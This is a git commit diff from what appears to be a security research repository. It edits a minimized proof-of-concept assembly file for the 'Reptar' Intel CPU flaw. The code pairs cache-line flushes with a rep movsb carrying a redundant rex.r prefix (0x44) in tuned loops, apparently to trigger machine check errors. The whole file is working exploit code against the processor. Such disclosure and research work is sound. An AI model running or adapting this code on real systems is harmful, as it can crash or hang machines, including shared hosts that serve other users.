0d927ad18cbf84e1a9aac1da0860d10e6773dded
eduardo <sirdarckcat@gmail.com>
2023-11-25 15:00:23 +0100

    simplify code for clarity

--- pocs/cpus/reptar/minimized/reptar.mce.asm
+++ pocs/cpus/reptar/minimized/reptar.mce.asm
@@ -7,25 +7,21 @@ section .text
         lea rsi, [rsp+1]
         mov rdi, rsi
         align 0x1000
-        %rep 64*8
-            align 64
-            pause
-        %endrep
+        times 8*64*64 pause
         .many_reptars:
-        align 0x1000
         %rep 64*8 ; icache has 8 ways 64 sets
-            align 64 ; icache line size
-            clflush [rdi-1] ; msrom ptr ; 4 bytes   ; 1 way
-            clflush [rsi+63]; msrom ptr ; 4 bytes   ; 1 way
+            clflush [rdi-1] ; 4uops     ; 4 bytes
+            clflush [rsi+63]; 4uops     ; 4 bytes
             dec rsi         ; 1uop      ; 3 bytes
             dec rdi         ; 1uop      ; 3 bytes
+            times 2 nop     ; 2uops     ; 2 bytes
+            ; 16 byte boundary + 2 ways
             inc rcx         ; 1uop      ; 3 bytes
-            times 6 nop
             rep
             db 0x44; rex.r
-            movsb           ; msrom ptr ; 3 bytes   ; 1 way
+            movsb           ; msrom ptr ; 3 bytes
             pause           ; 1uop      ; 2 bytes
             pause           ; 1uop      ; 2 bytes
+            align 64 ; icache line size
         %endrep
-        nop
-        times 1024 int3
+        times 8*64*64*100 pause
